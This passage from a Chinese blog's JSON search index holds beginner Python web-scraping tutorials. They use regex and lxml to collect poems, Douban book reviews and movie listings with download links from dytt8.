x=re.sub(r'&lt;.*?&gt;','',c) contents.append(x.strip()) poems=[] for value in zip(titles,years,autors,contents): title,year,autor,content=value poem={ &quot;title&quot;:title, &quot;year&quot;:year, &quot;autor&quot;:autor, &quot;content&quot;:content } poems.append(poem) for a in poems: print(a)def main(): base_url=&quot;https://www.gushiwen.org/default_{}.aspx&quot; for i in range(1,7): url=base_url.format(i) handler_url(url)if __name__ == '__main__': main() 二.爬取豆瓣热门图书12345678910111213141516171819202122232425262728293031323334353637383940414243import reimport requestsHEADERS={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36&quot;}def get_detail_page(url): resp=requests.get(url,headers=HEADERS) text=resp.text detail_pages=re.findall(r'&lt;div\\sclass=&quot;main-bd&quot;&gt;.*?&lt;a\\shref=&quot;(.*?)&quot;&gt;.*?&lt;/a&gt;',text,re.DOTALL) return detail_pagesdef handle_detail_page(url): book={} resp=requests.get(url,headers=HEADERS) text=resp.text titles=re.findall(r'&lt;div\\sclass=&quot;article&quot;&gt;.*?&lt;span.*?&gt;(.*?)&lt;/span&gt;',text,re.DOTALL) articles_tmp=re.findall(r'&lt;div\\sid=&quot;link-report&quot;&gt;.*?&lt;p&gt;.*&lt;/p&gt;',text,re.DOTALL) articles=[] for a in articles_tmp: x=re.sub(r'&lt;.*?&gt;','',a) y=x.replace('\\r','').replace('\\n','') a=re.sub(r'&lt;div\\s.*?&gt;','',y) b=a.replace(' ','') articles.append(b) # print(articles) # print(titles) book={ 'title':titles, 'article':articles } print(book)def main(): urls=[] base_url=&quot;https://book.douban.com/review/best/?start={}&quot; for i in range(0,41,20): url=base_url.format(i) urls.append(url) for a in urls: detail_urls=get_detail_page(a) for f in detail_urls: handle_detail_page(f)if __name__ == '__main__': main() 三.总结这两个小的爬虫项目，网站都没有进行反爬处理，所以说对于我们爬出页面信息还是比较简单的，关键在于数据怎么解析，最近一直在看正则表达式，所以找了两个小的项目练一练，这两个小项目也可以使用beatifulsoup或者xml库进行解析，找时间再试试别的方法解析数据吧~","link":"/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%8F%A4%E8%AF%97%E8%AF%8D%E7%BD%91%E4%B8%8E%E8%B1%86%E7%93%A3%E7%83%AD%E9%97%A8%E5%9B%BE%E4%B9%A6.html"},{"title":"爬虫实战_电影天堂爬虫","text":"前言近段时间一直在学习爬虫，昨天闲来无事做了一个简单的小爬虫来爬取电影天堂热门电影的前7页。本爬虫利用requests库和lxml库结合来解析得到的html代码，当然也可以使用BeautifulSoup库来解析，但我比较喜欢lxml库和XPATH语法相结合的解析。 这个实战是爬取电影天堂热门电影前七页。分为三步：1.获取每个页面的电影详细页；2.解析每个电影详细页；3.将第一步和第二步结合，爬取前七页。 具体代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import requestsfrom lxml import etreeBASE_DOMAIN=&quot;https://www.dytt8.net&quot;HEADERS={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;}def get_detail_url(url): resp = requests.get(url, headers=HEADERS) text = resp.text # print(text) html = etree.HTML(text) detail_urls = html.xpath(&quot;//ul//table[@class='tbspan']//a/@href&quot;) # def abc(url1): # return BASE_DOMAIN+url1 # index=0 # for detail_url in detail_urls: # detail_url = abc(detail_url) # detail_urls[index]=detail_url # index =index+1 detail_urls=map(lambda url:BASE_DOMAIN+url,detail_urls) return detail_urlsdef parse_detail_page(url): resp=requests.get(url,headers=HEADERS) text=resp.content.decode(&quot;gbk&quot;) movie={} #print(text) html=etree.HTML(text) #电影名称 title=html.xpath(&quot;//div[@class='title_all']//font[@color='#07519a']//text()&quot;)[0] movie['title']=title #电影海报 img=html.xpath(&quot;//div[@id='Zoom']//img/@src&quot;) cover=img movie['cover']=cover #div下所有文本 infos=html.xpath(&quot;//div[@id='Zoom']//text()&quot;) for index,info in enumerate(infos): def page_info(info,rules): info=info.replace(rules,&quot;&quot;).strip() return info if info.startswith(&quot;◎年 代&quot;): info=page_info(info,&quot;◎年 代&quot;) movie['year']=info elif info.startswith(&quot;◎产 地&quot;): info=page_info(info,&quot;◎产 地&quot;) movie['country']=info elif info.startswith(&quot;◎类 别&quot;): info=page_info(info,&quot;◎类 别&quot;) movie['类别']=info elif info.startswith(&quot;◎豆瓣评分&quot;): info=page_info(info,&quot;◎豆瓣评分&quot;) movie['豆瓣评分']=info elif info.startswith(&quot;◎导 演&quot;): info=page_info(info,&quot;◎导 演&quot;) dirctors=[info] for x in range(index+1,len(infos)): dirctor=infos[x].strip() if dirctor.startswith(&quot;◎编 剧&quot;): break dirctors.append(dirctor) movie['导演']=dirctors elif info.startswith(&quot;◎编 剧&quot;): info=page_info(info,&quot;◎编 剧&quot;) movie[&quot;编剧&quot;]=info elif info.startswith(&quot;◎主 演&quot;): info=page_info(info,&quot;◎主 演&quot;) actors=[info] for x in range(index+1,len(infos)): actor=infos[x].strip() if(actor.startswith(&quot;◎标 签&quot;)): break actors.append(actor) movie['actors']=actors elif info.startswith(&quot;◎简 介&quot;): info=page_info(info,&quot;◎简 介&quot;) for x in range(index+1,len(infos)): detail=infos[x].strip() if(detail.startswith(&quot;◎获奖情况&quot;)): break movie['detail']=detail download_url=html.xpath(&quot;//td[@bgcolor='#fdfddf']//a/text()&quot;) movie['download_url']=download_url return moviedef spider(): #爬取前7页 base_url=&quot;https://www.dytt8.net/html/gndy/dyzz/list_23_{}.html&quot; movies=[] for x in range(1,8): #第一个循环获取每个页面 url=base_url.format(x) detail_urls=get_detail_url(url) for detail_url in detail_urls: #第二个循环获取每个网页电影的详细页 movie=parse_detail_page(detail_url) movies.append(movie) print(movies)if __name__ == '__main__': spider() 第一步获取每个网页的电影详细页： 第二步解析电影详细页： 第三步爬取前七页：","link":"/%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98-%E7%94%B5%E5%BD%B1%E5%A4%A9%E5%A0%82%E7%88%AC%E8%99%AB.html"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"代码审计","slug":"代码审计","link":"/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"Web安全&渗透测试","slug":"Web安全-渗透测试","link":"/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Python","slug":"Python","link":"/tags/Python/"},{"name":"爬虫","slug":"爬虫","link":"/tags/%E7%88%AC%E8%99%AB/"}],"categories":[{"name":"CTF","slug":"CTF","link":"/categories/CTF/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"代码审计","slug":"代码审计","link":"/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"学习笔记","slug":"学习笔记","link":"/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"name":"Web安全&渗透测试","slug":"Web安全-渗透测试","link":"/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Python","slug":"Python","link":"/categories/Python/"},{"name":"爬虫","slug":"爬虫","link":"/categories/%E7%88%AC%E8%99%AB/"}]}